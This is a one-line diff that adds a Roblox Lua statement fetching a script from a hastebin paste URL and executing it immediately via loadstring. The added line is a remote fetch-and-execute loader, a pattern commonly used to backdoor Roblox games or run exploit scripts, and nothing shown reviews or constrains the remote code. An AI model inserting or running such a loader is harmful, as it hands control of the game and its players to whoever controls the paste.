@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://hastebin.com/raw/tokinuqovo",true))()
